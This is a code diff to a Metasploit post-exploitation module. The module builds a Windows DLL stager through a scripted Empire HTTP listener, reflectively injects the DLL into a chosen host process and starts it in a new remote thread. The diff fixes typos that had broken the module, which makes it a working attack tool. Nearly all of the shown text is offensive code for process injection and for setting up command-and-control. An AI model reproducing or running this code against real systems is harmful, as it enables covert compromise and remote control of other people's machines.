@@ -46,7 +46,7 @@ class MetasploitModule < Msf::Post
 
     #method to create the reflectivly injectable DLL
     def create_DLL
-      generate_reflective_DLL('Listener_Emp',@port)
+      generate_reflective_DLL('Listener_Emp_test3',@port)
     end
 
     #main function
@@ -67,14 +67,14 @@ class MetasploitModule < Msf::Post
       print_status("Injecting #{payload_path} into #{@pid}")
       dll_mem, offset = inject_dll_into_process(host_process, payload_path)
       print_status("DLL Injected. Executing Reflective loader")
-      host_process.thread.createe(dll_mem + offset, 0)
+      host_process.thread.create(dll_mem + offset, 0)
       print_status("DLL injected and invoked")
     end
 
     #method to generate reflective DLL from empire-cli
     def generate_reflective_DLL(listener_name, port)
       dll = File.open('/root/dll_generator.rc',"w")
-      dll.puts ("listeners\nuselisteners http\nset Name #{listener_name}\nset Port #{port}\nexecute\nlisteners\nusestager windows/dll\nset Listener #{listener_name}\nset Outfile /tmp/launcher-emp.dll\ngenerate")
+      dll.puts ("listeners\nuselistener http\nset Name #{listener_name}\nset Port #{port}\nexecute\nlisteners\nusestager windows/dll\nset Listener #{listener_name}\nset OutFile /tmp/launcher-emp.dll\ngenerate")
       dll.close
       command = './empire --resource /root/dll_generator.rc > /dev/null'
       value = system(command)
